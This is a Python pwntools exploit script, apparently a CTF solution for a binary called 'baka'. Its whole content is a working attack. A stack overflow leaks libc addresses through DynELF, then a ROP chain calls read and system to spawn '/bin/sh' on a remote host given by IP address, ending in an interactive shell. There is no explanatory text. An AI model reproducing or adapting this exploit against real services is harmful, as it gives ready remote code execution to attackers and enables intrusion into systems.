from pwn import *
#context.log_level = 'debug'
stuff = "I'm baka!\n" + '\x00'*2 + 'a'*28 + 'bbbb'
def leak(address):
    count = 0
    data = ''
    p1 = stuff + p32(0x080485ae) + p32(address)
    cn.sendline(p1)
    print cn.recvuntil('u!\n')
    up = ""
    while True:
        c = cn.recv(numb=1,timeout=0.2)
        count += 1
        if up == '\n' and c == "":
            data = data[:-1]
            data += "\x00"
            break
        else:
            data += c
        up = c
    data = data[:4]
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data
#/////////////////////////////
#cn = process('baka')
cn = remote('121.42.206.184',10001)
baka = ELF('baka')
p3ret=0x0804862d
base_bss = 0x0804a034
cn.recv()# come on, pwn me!
d = DynELF(leak, elf=ELF('baka'))
p_system = d.lookup('system','libc')
print "p_system => " + hex(p_system)
p_read = d.lookup('read','libc')
print "p_read => " + hex(p_read)
p2 = stuff + p32(p_read) + p32(p3ret) + p32(0) + p32(base_bss) + p32(10) + p32(p_system) + 'bbbb' + p32(base_bss)
print '\n###send payload 2###'
cn.sendline(p2)
cn.recvuntil('u!\n')#agree with u!
cn.send('/bin/sh\0')
time.sleep(0.3)
cn.interactive()
